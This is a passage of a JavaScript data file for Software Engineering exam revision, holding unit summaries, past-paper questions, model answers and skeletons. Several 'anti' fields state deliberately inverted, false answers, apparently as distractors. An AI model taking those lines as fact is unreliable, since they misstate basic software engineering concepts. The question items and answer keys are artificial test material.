window.SURE={"built":"2026-11-28","subjects":{"se":{"name":"Software Engineering","code":"CSC375","exam":"2026-12-10","totalQ":96,"totalM":645,"units":[{"n":10,"name":"Software Management","rank":1,"q":21,"m":145,"share":22,"cum":22,"hook":"Doubling the guests does not double the cooks, and doubling the cooks does not halve the time.","idea":"Management turns a wish into commitments: break the work down until each piece can be estimated, estimate by two independent methods, schedule the dependencies, keep a ranked risk list, and compare actual progress against the plan often enough to act. Effort grows faster than size because communication, coordination and rework grow with the number of people, not with the code; COCOMO expresses this through an exponent above one, so doubling size more than doubles effort, and duration rises only as the effort raised to a fraction, so a late large project cannot be rescued by schedule alone.","one":"Effort grows faster than size, so a plan is only honest while it is still being measured against reality.","gate":{"q":"Why is COCOMO effort not proportional to the number of lines of code?","a":"Effort grows faster than size because communication, coordination and rework grow with the number of people, not with the code. COCOMO expresses this through an exponent above one: about 1.05 in organic mode, 1.12 semi-detached and 1.20 embedded, so doubling size more than doubles effort. Duration rises only as the effort raised to a fraction, so a late large project cannot be rescued by schedule alone."},"top":{"id":"se-37","q":"In the software development process, how does software configuration management facilitate the changes that may occur during different stages of a software development life cycle? Justify your explanation with example.","y":"SE Question Bank 2080","marks":10,"rep":2,"ans":"Software configuration management (SCM) identifies, controls and tracks every item that makes up a product — code, documents, test data, build scripts — so change is deliberate, traceable and reversible. Activities — identification, version control, change control, status reporting and release — run in every phase:\n• Requirements: each requirement and SRS draft is a versioned configuration item; changes pass through a change request and the change control board (CCB).\n• Design: UML models are baselined; a design change is impact-analysed through a traceability matrix before approval.\n• Implementation: work is done on Git branches, so two programmers cannot silently overwrite each other.\n• Testing: test cases are versioned with the code, so a failure is reproducible against the exact build.\n• Release and maintenance: numbered baselines allow rollback and trace a defect to the shipped version.\nExample: the bus fare changes — a request is raised, the CCB approves, requirement, design and tests are updated together and released as v2.1 while v2.0 stays for rollback.\nDraw: request → impact analysis → CCB → implement → test → new baseline.","skel":["SCM = identify, control, track all configuration items","Four activities plus build and release","Requirements and design: versioned, baselined, CCB approved","Code and tests: branches, traceability, reproducible builds","Example: fare change released as v2.1, rollback kept"],"logic":"Group A favourite: it tests whether SCM is seen as a lifecycle-wide discipline rather than a version-control tool, and whether the student can justify it with an example.","how":"Definition, then requirement, design, code, test, release in order — one line each — and close with the fare-change example.","gateA":"Software configuration management (SCM) identifies, controls and tracks every item that makes up a product — code, documents, test data, build scripts — so change is deliberate, traceable and reversible. Activities — identification, version control, change control, status reporting and release — run in every phase:\n• Requirements: each requirement and SRS draft is a versioned configuration item; changes pass through a change request and the change control board (CCB).\n• Design: UML models are baselined; a design change is impact-analysed through a traceability matrix before approval.\n• Implementation: work is done on Git branches, so two programmers cannot silently overwrite each other.\n• Testing: test cases are versioned with the code, so a failure is reproducible against the exact build.\n• Release and maintenance: numbered baselines allow rollback and trace a defect to the shipped version.\nExample: the bus fare changes — a request is raised, the CCB approves, requirement, design and tests are updated together and released as v2.1 while v2.0 stays for rollback.\nDraw: request → impact analysis → CCB → implement → test → new baseline. SCM = identify, control, track all configuration items Four activities plus build and release Requirements and design: versioned, baselined, CCB approved Code and tests: branches, traceability, reproducible builds Example: fare change released as v2.1, rollback kept","anti":"Software configuration management mainly slows change down: it locks every artefact so that requirements, design, code and tests cannot be revised, and a change request is absorbed silently without a baseline or rollback, which is why teams should keep configuration control out of the life cycle."},"keys":["Project management","Work breakdown structure","COCOMO","COCOMO modes","COCOMO equations","Function points"],"ask":[{"id":"se-37","q":"In the software development process, how does software configuration management facilitate the changes that may occur during different stages of a software development life cycle? Justify your explanation with example.","y":"SE Question Bank 2080","marks":10,"rep":2},{"id":"se-56","q":"Discuss COCOMO model in cost estimation of software in detail.","y":"SE Model Question I","marks":5,"rep":2},{"id":"se-15","q":"What is project management? Explain different project management activities in detail. Discuss risk management process with suitable example showing how risks are identified, analyzed, and mitigated in a software project.","y":"SE Model Set II","marks":10,"rep":0},{"id":"se-63","q":"Discuss different types of risks which are likely to arise in software projects. Briefly explain risk analysis stage during risk management process.","y":"SE Question Bank 2076","marks":10,"rep":0}],"reps":[{"id":"r11","q":"In the software development process, how does software configuration management facilitate the changes that may occur during different stages of a software development life cycle? Justify your explanation with example.","count":2,"marks":10},{"id":"r23","q":"Explain with example how COCOMO can be used for software cost estimation?","count":2,"marks":5}]},{"n":8,"name":"Software Testing","rank":2,"q":12,"m":90,"share":14,"cum":36,"hook":"A bus can pass every workshop check and still be too tall for the bridge on its route.","idea":"Testing compares what the system does against what it was supposed to do, with the expectation taken from the specification rather than from the code's own logic. Coverage counts the structure the tests walked through, not the requirements the system had to meet: a suite written from existing code cannot cover an omitted requirement, a wrong assumption about the user, or a timing and load fault that appears only when the whole system runs. Coverage is therefore a measure of confidence, not proof, and inspection plus system and acceptance testing remain necessary.","one":"Testing cannot prove a system has no bugs; it can only show which risks have actually been looked at.","gate":{"q":"Why can full branch coverage still leave a system that fails in use?","a":"Coverage counts the structure the tests walked through, not the requirements the system had to meet. A test suite written from existing code cannot cover a requirement that was omitted, a wrong assumption about the user, or a timing and load fault that appears only when the whole system runs. Coverage is therefore a measure of confidence, not proof, and inspection plus system and acceptance testing remain necessary."},"top":{"id":"se-30","q":"Difference between verification and validation. Explain software inspection process.","y":"SE Question Bank 2081","marks":5,"rep":2,"ans":"Verification asks 'are we building the product right?' — it confirms that a work product conforms to its specification. It is static: reviews, inspections, walkthroughs.\nValidation asks 'are we building the right product?' — it confirms that the system meets the user's real need. It is dynamic: testing with real data, acceptance and beta testing.\nSo verification compares the artefact with the specification, while validation compares the product with the need; a system can be verified against a wrong specification.\nInspection is a formal, static, team review against a checklist:\n1. Planning — entry criteria, checklist, documents distributed.\n2. Overview — author briefs the team.\n3. Preparation — each inspector lists defects alone.\n4. Meeting — recorder logs defects; no solutions, author does not defend.\n5. Rework — author fixes them.\n6. Follow-up — moderator verifies and checks exit criteria.\nRoles: moderator, author, three or four inspectors, recorder.","skel":["Verification: building the product right, static, against spec","Validation: building the right product, dynamic, against need","Inspection: formal static team review with checklist","Roles: moderator, author, inspectors, recorder","Stages: plan, overview, prepare, meeting, rework, follow-up"],"logic":"Tests the verification/validation distinction with the two classic questions, then inspection as a static process with roles and stages — a pairing examiners like because the contrast is clean.","how":"Two-line contrast with both 'are we building...' questions, then the six inspection stages. The definitions alone are two easy marks.","gateA":"Verification asks 'are we building the product right?' — it confirms that a work product conforms to its specification. It is static: reviews, inspections, walkthroughs.\nValidation asks 'are we building the right product?' — it confirms that the system meets the user's real need. It is dynamic: testing with real data, acceptance and beta testing.\nSo verification compares the artefact with the specification, while validation compares the product with the need; a system can be verified against a wrong specification.\nInspection is a formal, static, team review against a checklist:\n1. Planning — entry criteria, checklist, documents distributed.\n2. Overview — author briefs the team.\n3. Preparation — each inspector lists defects alone.\n4. Meeting — recorder logs defects; no solutions, author does not defend.\n5. Rework — author fixes them.\n6. Follow-up — moderator verifies and checks exit criteria.\nRoles: moderator, author, three or four inspectors, recorder. Verification: building the product right, static, against spec Validation: building the right product, dynamic, against need Inspection: formal static team review with checklist Roles: moderator, author, inspectors, recorder Stages: plan, overview, prepare, meeting, rework, follow-up","anti":"Verification is dynamic testing against the user's real need, while validation is static review against the specification, so inspection is only a final acceptance test and cannot find defects before testing."},"keys":["Verification","Validation","Software inspection","Unit testing","Integration strategies","System testing"],"ask":[{"id":"se-30","q":"Difference between verification and validation. Explain software inspection process.","y":"SE Question Bank 2081","marks":5,"rep":2},{"id":"se-1","q":"List different stakeholders involved in software inspection. How software inspection is carried out? Explain","y":"SE Question Bank 2082","marks":10,"rep":0},{"id":"se-13","q":"What is software testing? Explain the software testing process in detail. Differentiate between development testing and release testing. How does Test-Driven Development (TDD) improve software quality? Explain with an example.","y":"SE Model Set II","marks":10,"rep":0},{"id":"se-70","q":"What is clean room software development? Discuss the characteristics of cleanroom software development.","y":"SE Question Bank 2076","marks":10,"rep":0}],"reps":[{"id":"r22","q":"Differentiate between verification and validation. Explain the software Inspection process.","count":2,"marks":5}]},{"n":2,"name":"Software Processes","rank":3,"q":11,"m":85,"share":13,"cum":50,"hook":"A wedding kitchen that cooks the entire menu before tasting anything has bet the whole feast on one guess.","idea":"A process model fixes the order of the same four activities — specification, design and implementation, validation, evolution — plus who does them and what evidence closes each stage. Which model you follow is decided by the stability of the requirements and the shape of the contract, not fashion: waterfall signs off each phase and delivers once, so it gives milestones and a fixed price but pushes all integration risk into late testing; incremental delivery ships prioritised, usable slices, absorbing change early at the cost of shared architecture, refactoring and repeated integration. Choosing against requirement volatility moves every correction to its most expensive point.","one":"A process model is a bet about how wrong your requirements will be; pick it by how much change you expect.","gate":{"q":"What decides whether a project should follow waterfall or be delivered incrementally?","a":"The stability of the requirements and the shape of the contract decide, not fashion. Waterfall signs off each phase and delivers once, so it gives milestones and a fixed price but pushes all integration risk into late testing. Incremental delivery ships prioritised, usable slices, absorbing change early at the cost of shared architecture, refactoring and repeated integration. Choosing against requirement volatility moves every correction to its most expensive point."},"top":{"id":"se-73","q":"Explain how prototyping model help in developing software? Differentiate between Evolutionary and throw-away prototype model.","y":"SE Question Bank 2079","marks":10,"rep":2,"ans":"Prototyping helps because a prototype is built early, shown to users and refined, so it (1) clarifies vague or conflicting requirements that interviews miss; (2) checks feasibility of technology or interface before heavy investment; (3) improves communication — users react to a working screen far better than to a document; (4) cuts requirement risk and rework by finding errors while change is cheap; (5) supports incremental delivery where an evolutionary prototype grows into the product.\n\nEvolutionary prototype: built with real architecture and quality, then refined through versions until it is the delivered system. Used when requirements are unclear and the domain changes fast — web and mobile products. Advantage: early feedback, always a working system. Risk: poor structure creeps in, documentation lags, temporary code ships.\n\nThrow-away (rapid) prototype: built quickly with minimal engineering to answer one question, then discarded while the real system is built properly. Used to explore interface, feasibility or requirements for a large stable system. Advantage: no compromise on final quality. Risk: wasted effort and pressure to ship it anyway.\n\nKey difference: evolutionary — the prototype is the product and must be engineered; throw-away — it is a learning device, deliberately discarded.","skel":["Five ways prototyping helps the project","Evolutionary: becomes the product, engineered","Throw-away: discarded, real system rebuilt properly","Contrast quality, cost, risk and fate","Draw the prototype-evaluate-refine loop"],"logic":"Separates the two prototype lifecycles — students call every prototype evolutionary and lose marks on discarding, quality and fate of the code.","how":"One help list, then a two-column contrast on purpose, quality, fate and risk; draw the prototype-evaluate-refine loop.","gateA":"Prototyping helps because a prototype is built early, shown to users and refined, so it (1) clarifies vague or conflicting requirements that interviews miss; (2) checks feasibility of technology or interface before heavy investment; (3) improves communication — users react to a working screen far better than to a document; (4) cuts requirement risk and rework by finding errors while change is cheap; (5) supports incremental delivery where an evolutionary prototype grows into the product.\n\nEvolutionary prototype: built with real architecture and quality, then refined through versions until it is the delivered system. Used when requirements are unclear and the domain changes fast — web and mobile products. Advantage: early feedback, always a working system. Risk: poor structure creeps in, documentation lags, temporary code ships.\n\nThrow-away (rapid) prototype: built quickly with minimal engineering to answer one question, then discarded while the real system is built properly. Used to explore interface, feasibility or requirements for a large stable system. Advantage: no compromise on final quality. Risk: wasted effort and pressure to ship it anyway.\n\nKey difference: evolutionary — the prototype is the product and must be engineered; throw-away — it is a learning device, deliberately discarded. Five ways prototyping helps the project Evolutionary: becomes the product, engineered Throw-away: discarded, real system rebuilt properly Contrast quality, cost, risk and fate Draw the prototype-evaluate-refine loop","anti":"Prototyping helps mainly by freezing requirements early: a throw-away prototype is engineered into the product, while an evolutionary prototype is discarded, so the model removes the need for user feedback and adds no cost or risk."},"keys":["Software process","Four process activities","Waterfall","Incremental development","Integration and configuration","Throw-away prototyping"],"ask":[{"id":"se-73","q":"Explain how prototyping model help in developing software? Differentiate between Evolutionary and throw-away prototype model.","y":"SE Question Bank 2079","marks":10,"rep":2},{"id":"se-27","q":"What do you understand by software process model? Explain different software process activities.","y":"SE Question Bank 2081","marks":10,"rep":0},{"id":"se-3","q":"Why do you think software needs to be changed? Explain any one model that can be used to cope with the change.","y":"SE Question Bank 2082","marks":10,"rep":0},{"id":"se-50","q":"Explain the different software life cycle models and compare them with advantages and disadvantages.","y":"SE Model Question I","marks":10,"rep":0}],"reps":[{"id":"r9","q":"Explain how prototyping model help in developing software? Differentiate between Evolutionary and throw-away prototype model.","count":2,"marks":10}]},{"n":4,"name":"Requirements Engineering","rank":4,"q":11,"m":80,"share":12,"cum":62,"hook":"The customer says 'a loan for my shop'; the bank's file must say how much, at what rate, repaid by when.","idea":"Requirements engineering turns wishes into numbered, testable statements by asking the right people, negotiating conflicts, writing the result precisely and tracking every later change. Functional requirements say what the system does, and a missing one shows up as a feature that simply fails; non-functional requirements say how well it does it, so they decide the architecture and cannot be retrofitted by better coding later. They are also the ones written vaguely, which makes them untestable, so each must be given a measurable metric.","one":"A requirement is finished only when someone can write a test that would prove it was not met.","gate":{"q":"Why are non-functional requirements usually more critical than functional ones?","a":"Functional requirements say what the system does, and a missing one shows up as a feature that simply fails. Non-functional requirements say how well it must do it, so they decide the architecture and cannot be retrofitted by better coding later. They are also the ones written vaguely, which makes them untestable, so each must be given a measurable metric."},"top":{"id":"se-38","q":"Explain the main activities used in requirements engineering. What are the desirable characteristics of a good SRS documents? Explain with example.","y":"SE Question Bank 2080","marks":10,"rep":0,"ans":"Requirements engineering has four core activities plus management:\n1. Elicitation — gather needs through interviews, observation, questionnaires, document analysis and prototyping.\n2. Analysis and negotiation — classify, prioritise and resolve conflicting stakeholder demands.\n3. Specification — record agreed requirements in an SRS using structured natural language, use cases or models.\n4. Validation — confirm the requirements are valid, complete, consistent, realistic and verifiable via reviews, prototyping and test generation.\n5. Requirements management — control change with requests, impact analysis and traceability.\nA good SRS is: complete (nothing missing), consistent (no contradictions), unambiguous, verifiable (each requirement testable), traceable (linked to design and tests), feasible, prioritised and uniquely identified.\nExample: \"The system should be fast\" is a bad line. \"The system shall confirm a seat booking within 3 seconds for 500 concurrent users\" is unambiguous, verifiable and traceable to test case T-21.","skel":["Elicitation, analysis and negotiation, specification, validation, management","Name one technique per activity","SRS: complete, consistent, unambiguous, verifiable, traceable","Example rewritten from vague to measurable","Draw the four-activity loop"],"logic":"Combines process knowledge with document quality; examiners want named activities plus testable SRS properties, and most students describe only elicitation.","how":"Five activities as numbered lines, then five SRS characteristics. Anchor each vague adjective to a bus-ticketing sentence.","gateA":"Requirements engineering has four core activities plus management:\n1. Elicitation — gather needs through interviews, observation, questionnaires, document analysis and prototyping.\n2. Analysis and negotiation — classify, prioritise and resolve conflicting stakeholder demands.\n3. Specification — record agreed requirements in an SRS using structured natural language, use cases or models.\n4. Validation — confirm the requirements are valid, complete, consistent, realistic and verifiable via reviews, prototyping and test generation.\n5. Requirements management — control change with requests, impact analysis and traceability.\nA good SRS is: complete (nothing missing), consistent (no contradictions), unambiguous, verifiable (each requirement testable), traceable (linked to design and tests), feasible, prioritised and uniquely identified.\nExample: \"The system should be fast\" is a bad line. \"The system shall confirm a seat booking within 3 seconds for 500 concurrent users\" is unambiguous, verifiable and traceable to test case T-21. Elicitation, analysis and negotiation, specification, validation, management Name one technique per activity SRS: complete, consistent, unambiguous, verifiable, traceable Example rewritten from vague to measurable Draw the four-activity loop","anti":"Requirements engineering starts with specification and ends with elicitation, because writing the SRS first tells stakeholders what to want; analysis only records the document and validation is unnecessary once the SRS is complete."},"keys":["Requirement","User requirement","System requirement","Functional requirement","Non-functional requirement","Domain requirement"],"ask":[{"id":"se-38","q":"Explain the main activities used in requirements engineering. What are the desirable characteristics of a good SRS documents? Explain with example.","y":"SE Question Bank 2080","marks":10,"rep":0},{"id":"se-51","q":"Differentiate between functional and non-functional requirements. What are the various types of functional and non-functional requirements that are placed on the system? Explain with an example.","y":"SE Model Question I","marks":10,"rep":0},{"id":"se-64","q":"Briefly explain functional, non-functional, and domain requirements.","y":"SE Question Bank 2076","marks":10,"rep":0},{"id":"se-66","q":"What is formal specification? Discuss interface specification in detail.","y":"SE Question Bank 2076","marks":10,"rep":0}],"reps":[]},{"n":5,"name":"System Modeling","rank":5,"q":12,"m":75,"share":12,"cum":74,"hook":"No single drawing explains a hospital: the referral letter, the OPD queue and the lab form each answer a different question.","idea":"A model is a deliberate simplification: keep what answers one question, drop the rest, and draw it in a notation everyone reads the same way. Context fixes the boundary, interaction fixes who talks to whom and in what order, structural models fix what exists, behavioural models fix how it changes over time. Because every view hides what the next needs, the models must be kept consistent with each other, and that comparison is where contradictions surface.","one":"A model is not a smaller system; it is the part of the system that answers one question.","gate":{"q":"Why does a complete system specification need several models instead of one diagram?","a":"Each model deliberately drops detail so that one question can be answered clearly. The context model fixes the boundary, use cases give actor goals, sequence diagrams fix message order, class diagrams fix structure, and state machines fix allowed behaviour. Because every view hides what the next needs, the models must be kept consistent with each other, and that comparison is where contradictions surface."},"top":{"id":"se-33","q":"Differentiate between structural and behavioral models. What is the importance of behavioral model.","y":"SE Question Bank 2081","marks":5,"rep":2,"ans":"A structural model describes the static organisation of a system — its components and how they connect — and says nothing about execution. A behavioural model describes what happens at run time: states, events, transitions and activity flow.\n• Structural: class, component and deployment diagrams — e.g. Bus, Ticket and Passenger with associations and multiplicity.\n• Behavioural: state machine, activity and sequence diagrams — e.g. a Ticket moving reserved → paid → cancelled.\nImportance: the behavioural model shows the order of interactions, so a designer can confirm every event is handled, find dead or unreachable states, and expose timing and concurrency errors a static view hides. Each transition also becomes a ready-made test case.\nDraw a class diagram beside a state machine for the same ticket.","skel":["Structural = static organisation; behavioural = dynamic response to events","Structural: class, component, deployment diagrams","Behavioural: state machine, activity, sequence diagrams","Importance: dead states, unhandled events, timing errors","Draw class diagram vs state machine for a ticket"],"logic":"Tests whether the student can separate static structure from run-time behaviour — most candidates define both but fail to say why the behavioural view earns its keep.","how":"Two definitions, one diagram each, then two lines on importance. Draw a class diagram beside a state machine of the same ticket.","gateA":"A structural model describes the static organisation of a system — its components and how they connect — and says nothing about execution. A behavioural model describes what happens at run time: states, events, transitions and activity flow.\n• Structural: class, component and deployment diagrams — e.g. Bus, Ticket and Passenger with associations and multiplicity.\n• Behavioural: state machine, activity and sequence diagrams — e.g. a Ticket moving reserved → paid → cancelled.\nImportance: the behavioural model shows the order of interactions, so a designer can confirm every event is handled, find dead or unreachable states, and expose timing and concurrency errors a static view hides. Each transition also becomes a ready-made test case.\nDraw a class diagram beside a state machine for the same ticket. Structural = static organisation; behavioural = dynamic response to events Structural: class, component, deployment diagrams Behavioural: state machine, activity, sequence diagrams Importance: dead states, unhandled events, timing errors Draw class diagram vs state machine for a ticket","anti":"A structural model describes run-time states and events, while a behavioural model describes the static class structure, so behavioural models are unimportant because execution can be read from the class diagram."},"keys":["System model","Context model","Use case diagram","Sequence diagram","Class diagram","State machine diagram"],"ask":[{"id":"se-33","q":"Differentiate between structural and behavioral models. What is the importance of behavioral model.","y":"SE Question Bank 2081","marks":5,"rep":2},{"id":"se-26","q":"Draw use case diagram, class diagram and sequence diagram for online book recommendation system. Make your own assumptions.","y":"SE Question Bank 2081","marks":10,"rep":0},{"id":"se-61","q":"Explain system modeling with suitable example.","y":"SE Question Bank 2076","marks":10,"rep":0},{"id":"se-69","q":"Discuss the importance of use case diagram in object-oriented development. Draw a use case diagram for library system.","y":"SE Question Bank 2076","marks":10,"rep":0}],"reps":[{"id":"r21","q":"Differentiate between structural and behavioral models. What is the importance of behavioral model.","count":2,"marks":5}]},{"n":6,"name":"Architectural Design","rank":6,"q":5,"m":45,"share":7,"cum":81,"hook":"You can repaint a hotel room in a week; you cannot move the lift shaft after the slab is poured.","idea":"Architectural design fixes the components, their responsibilities and the connections they are allowed before anyone writes detail code. The non-functional requirement the system cannot afford to lose decides, because each pattern buys one quality at the price of another: layering buys substitutability and adds latency; a repository buys shared consistent data and creates a bottleneck; client-server centralises control and creates one point of failure. The choice is defensible only when the accepted cost is written down.","one":"Architecture is the set of decisions that are expensive to reverse, and patterns are the ones others already paid for.","gate":{"q":"What decides which architectural pattern a system should be built on?","a":"The non-functional requirement the system cannot afford to lose decides, because each pattern buys one quality at the price of another. Layering buys substitutability and adds latency; a repository buys shared consistent data and creates a bottleneck; client-server centralises control and creates one point of failure. The choice is defensible only when the accepted cost is written down."},"top":{"id":"se-14","q":"Explain architectural design decisions that must be made during the architectural design process. Describe the following architectural patterns with suitable diagrams:","y":"SE Model Set II","marks":10,"rep":0,"ans":"Architectural design decisions:\n• Architecture style — layered, client-server, MVC, pipe-filter or repository, chosen by quality attributes.\n• Distribution — centralised, client-server or multi-tier; where processing and data sit.\n• Technology platform — language, framework, database, cloud; buy versus build.\n• Non-functional priorities — the trade-off between performance, security, availability and modifiability, recorded explicitly.\n• Data storage and access — single central database versus replication, and consistency needs.\n• Documentation — record decisions, their rationale and the architectural views.\n(a) MVC — Model holds data and rules, View displays, Controller takes input and updates the model. Draw Model ↔ View with Controller between them. Pro: UI and logic change independently; con: extra indirection.\n(b) Client-server — clients request services, the server holds logic and data. Draw three client boxes → server → database. Pro: central data, security and control; con: server bottleneck, single point of failure, network dependence.\n(c) Pipe and filter — each filter transforms data passed along a pipe. Draw input → filter1 → filter2 → filter3 → output. Pro: filters are reusable and recombinable; con: poor for interactive use, conversion overhead.","skel":["Decisions: style, distribution, platform, NFR priority, data, buy vs build","MVC: model, view, controller triangle with arrows","Client-server: clients, server, database","Pipe and filter: input through sequential filters","One pro and one con for each pattern"],"logic":"Tests that architecture is a set of decisions with trade-offs, and that you can draw three classic patterns with structure, benefit and cost — not just name them.","how":"Five decisions first, then each pattern as 'structure + diagram + pro + con'. Draw three small boxes-and-arrows figures.","gateA":"Architectural design decisions:\n• Architecture style — layered, client-server, MVC, pipe-filter or repository, chosen by quality attributes.\n• Distribution — centralised, client-server or multi-tier; where processing and data sit.\n• Technology platform — language, framework, database, cloud; buy versus build.\n• Non-functional priorities — the trade-off between performance, security, availability and modifiability, recorded explicitly.\n• Data storage and access — single central database versus replication, and consistency needs.\n• Documentation — record decisions, their rationale and the architectural views.\n(a) MVC — Model holds data and rules, View displays, Controller takes input and updates the model. Draw Model ↔ View with Controller between them. Pro: UI and logic change independently; con: extra indirection.\n(b) Client-server — clients request services, the server holds logic and data. Draw three client boxes → server → database. Pro: central data, security and control; con: server bottleneck, single point of failure, network dependence.\n(c) Pipe and filter — each filter transforms data passed along a pipe. Draw input → filter1 → filter2 → filter3 → output. Pro: filters are reusable and recombinable; con: poor for interactive use, conversion overhead. Decisions: style, distribution, platform, NFR priority, data, buy vs build MVC: model, view, controller triangle with arrows Client-server: clients, server, database Pipe and filter: input through sequential filters One pro and one con for each pattern","anti":""},"keys":["Architectural design","4+1 views","Layered pattern","Client-server","MVC","Pipe and filter"],"ask":[{"id":"se-14","q":"Explain architectural design decisions that must be made during the architectural design process. Describe the following architectural patterns with suitable diagrams:","y":"SE Model Set II","marks":10,"rep":0},{"id":"se-39","q":"Explain architectural views. Illustrate on layered architecture, repository architecture, and pipe and filter architecture.","y":"SE Question Bank 2080","marks":10,"rep":0},{"id":"se-67","q":"What are the activities of architectural design process? Discuss abstract machine model.","y":"SE Question Bank 2076","marks":10,"rep":0},{"id":"se-68","q":"What is modular decomposition? Discuss object oriented model of decomposition.","y":"SE Question Bank 2076","marks":10,"rep":0}],"reps":[]},{"n":7,"name":"Design and Implementation","rank":7,"q":8,"m":40,"share":6,"cum":87,"hook":"A cycle mended with welded parts runs today and cannot be repaired next year.","idea":"Design sets the seams: what a part hides inside and what it promises outside. Cohesion measures whether the responsibilities inside a component belong together, so high cohesion gives one reason to change; coupling measures how much one component depends on another, so low coupling stops a change from rippling outward. Information hiding reinforces both by exposing only a stable interface, and the consequence is that a part can be replaced without opening the system. Implementation keeps those seams honest with version control, review and refactoring.","one":"Good design is knowing where the cuts go: parts you can lift out without rebuilding the machine.","gate":{"q":"Why should cohesion be high and coupling low in a design that must survive change?","a":"Cohesion measures whether the responsibilities inside a component belong together, so high cohesion gives one reason to change; coupling measures how much one component depends on another, so low coupling stops a change from rippling outward. Information hiding reinforces both by exposing only a stable interface. The consequence is that a part can be replaced without opening the system."},"top":{"id":"se-22","q":"What do you understand by implementation issues in software development? Discuss reuse, configuration management, and host-target development as implementation issues.","y":"SE Model Set II","marks":5,"rep":0,"ans":"Implementation issues are the largely non-coding problems met while turning a design into a running system; they often cost more than coding.\n• Reuse — assembling from libraries, frameworks or COTS. Issues: the component rarely fits exactly, licence terms, unknown quality, no control over its evolution. Handle: evaluate first, wrap it behind your own interface, pin versions, keep a replacement path.\n• Configuration management — parallel changes cause lost updates, wrong versions and unreproducible builds. Handle: one repository with a branching policy, baselines, automated CI builds, tagged releases and change control.\n• Host-target development — code is written on a host (laptop, IDE) but runs on a different target (Android device, embedded controller, server). Handle: cross-compilers, emulators, identical container images, staged environments and install scripts.\nPlan all three early; retrofitting version control or parity testing costs far more later.","skel":["Define implementation issues as non-coding problems","Reuse: mismatch, licence, evolution — evaluate and wrap","Configuration management: versions, parallel change — repo, CI, baselines","Host-target: different platforms — cross-compiler, emulator, containers","Plan early; retrofitting costs more"],"logic":"A structured repeat of the implementation-issues question: it demands three specific issues discussed by name, each with why it is a problem and how it is handled.","how":"Repeats the earlier implementation-issues question, so it is a sure shot. Three headings, each with issue then handle, and one closing line.","gateA":"Implementation issues are the largely non-coding problems met while turning a design into a running system; they often cost more than coding.\n• Reuse — assembling from libraries, frameworks or COTS. Issues: the component rarely fits exactly, licence terms, unknown quality, no control over its evolution. Handle: evaluate first, wrap it behind your own interface, pin versions, keep a replacement path.\n• Configuration management — parallel changes cause lost updates, wrong versions and unreproducible builds. Handle: one repository with a branching policy, baselines, automated CI builds, tagged releases and change control.\n• Host-target development — code is written on a host (laptop, IDE) but runs on a different target (Android device, embedded controller, server). Handle: cross-compilers, emulators, identical container images, staged environments and install scripts.\nPlan all three early; retrofitting version control or parity testing costs far more later. Define implementation issues as non-coding problems Reuse: mismatch, licence, evolution — evaluate and wrap Configuration management: versions, parallel change — repo, CI, baselines Host-target: different platforms — cross-compiler, emulator, containers Plan early; retrofitting costs more","anti":""},"keys":["Cohesion","Coupling","Information hiding","Singleton","Adapter","Observer"],"ask":[{"id":"se-22","q":"What do you understand by implementation issues in software development? Discuss reuse, configuration management, and host-target development as implementation issues.","y":"SE Model Set II","marks":5,"rep":0},{"id":"se-24","q":"Write short notes on:","y":"SE Model Set II","marks":5,"rep":0},{"id":"se-31","q":"What do you understand by design patterns? What role does it have in object oriented design.","y":"SE Question Bank 2081","marks":5,"rep":0},{"id":"se-52","q":"Explain the component base software engineering and its advantages.","y":"SE Model Question I","marks":5,"rep":0}],"reps":[]},{"n":9,"name":"Software Evolution","rank":8,"q":6,"m":30,"share":5,"cum":91,"hook":"The jeep that has carried goods to the village for twenty years is held together by patches, and cannot be retired.","idea":"Evolution treats change as the normal case: a request is logged, analysed for what else it touches, planned into a release, implemented and tested. Maintenance is classified by purpose — corrective, adaptive, perfective, preventive — because each needs a different share of the budget. Most post-delivery change is not repair but improvement: once a system works, users ask for more functions, better performance and new reporting, so perfective maintenance is about half of maintenance effort, against roughly twenty per cent corrective and twenty-five adaptive. Since maintenance is about sixty per cent of lifetime cost, structure and documented design decide whether that demand can be met affordably.","one":"A system nobody planned to change is a system that will soon be too expensive to change.","gate":{"q":"Why does perfective maintenance take the largest share of maintenance effort?","a":"Because most post-delivery change is not repair but improvement: once a system works, users ask for more functions, better performance and new reporting. Perfective maintenance is therefore about half of maintenance effort, against roughly twenty per cent corrective and twenty-five adaptive, with preventive the smallest. Since maintenance is about sixty per cent of lifetime cost, structure and documented design decide whether that demand can be met affordably."},"top":{"id":"se-23","q":"Differentiate between corrective, adaptive, perfective, and preventive maintenance. Which type of maintenance consumes the most resources and why?","y":"SE Model Set II","marks":5,"rep":0,"ans":"• Corrective (≈20%) — fixing defects found after delivery, such as a wrong VAT calculation or a crash on save.\n• Adaptive (≈25%) — adapting to a changed environment: new OS or browser, new tax rule, cloud migration, new payment gateway.\n• Perfective (≈50%) — improving the system: new features, faster queries, a better interface, refactoring for maintainability.\n• Preventive (≈5%) — reducing future deterioration: refactoring, updating libraries, adding tests before problems appear.\nPerfective maintenance consumes the most resources because a successful system generates continuous requests for new and changed functionality, and each change needs design, coding, regression testing and documentation; its share grows the longer the system stays in service. Corrective feels urgent but is a small slice; adaptive spikes only when platforms or regulations change.","skel":["Corrective: fix reported defects, reactive","Adaptive: new environment, platform, regulation","Perfective: new features, performance, maintainability","Preventive: refactoring and library updates before failure","Perfective dominates because users keep requesting change"],"logic":"Tests the four maintenance categories with their drivers and the widely examined fact that perfective maintenance dominates — with a reason, not just a percentage.","how":"Four bullets with a one-line example each, then a short defence of perfective as the largest share. Percentages are a bonus, the reason is the mark.","gateA":"• Corrective (≈20%) — fixing defects found after delivery, such as a wrong VAT calculation or a crash on save.\n• Adaptive (≈25%) — adapting to a changed environment: new OS or browser, new tax rule, cloud migration, new payment gateway.\n• Perfective (≈50%) — improving the system: new features, faster queries, a better interface, refactoring for maintainability.\n• Preventive (≈5%) — reducing future deterioration: refactoring, updating libraries, adding tests before problems appear.\nPerfective maintenance consumes the most resources because a successful system generates continuous requests for new and changed functionality, and each change needs design, coding, regression testing and documentation; its share grows the longer the system stays in service. Corrective feels urgent but is a small slice; adaptive spikes only when platforms or regulations change. Corrective: fix reported defects, reactive Adaptive: new environment, platform, regulation Perfective: new features, performance, maintainability Preventive: refactoring and library updates before failure Perfective dominates because users keep requesting change","anti":""},"keys":["Software evolution","Corrective maintenance","Adaptive maintenance","Perfective maintenance","Preventive maintenance","Legacy system"],"ask":[{"id":"se-23","q":"Differentiate between corrective, adaptive, perfective, and preventive maintenance. Which type of maintenance consumes the most resources and why?","y":"SE Model Set II","marks":5,"rep":0},{"id":"se-29","q":"“Software maintenance is one of the most importance activity.” Justify the statement with an example.","y":"SE Question Bank 